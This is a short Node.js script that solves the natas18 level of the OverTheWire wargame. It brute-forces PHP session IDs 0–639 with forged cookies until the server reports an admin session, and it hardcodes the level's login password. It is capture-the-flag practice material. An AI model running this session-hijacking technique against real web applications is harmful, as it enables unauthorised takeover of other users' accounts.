#!/usr/bin/env node
/* eslint-disable */
http = require('http');

abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP';
credentials = {
    host: 'natas18.natas.labs.overthewire.org',
    login: 'natas18',
    password: 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
}

let i=640

while(i--)
    doReq(i)

function doReq(n) {
	const id = n
    console.log('start ', n);
    const postData = 'username=admin&password=radmin';
    const data = 'username=admin&password=admin';


    const options = {
        host: credentials.host,
        path: '/index.php?debug=true',
        method: 'POST',
        auth: `${credentials.login}:${credentials.password}`,
        headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'COOKIE': 'PHPSESSID=' + n
            }
    };

    const req = http.request(options, (res) => {
        // console.log(`STATUS: ${res.statusCode}`);
        // console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
        res.setEncoding('utf8');
        let total = '';
        res.on('data', (chunk) => {
            total += chunk;
        });
        res.on('end', () => {
            if(total.match('You are an admin.')) {
		    console.log(id)
                console.log(total);
                process.exit()
            }
            
        });
    });
        req.on('error', (e) => {
            console.error(`problem with request: ${e.message}`);
            process.exit();
        });

        // write data to request body
        req.write(postData);
        req.end();
}

doReq();
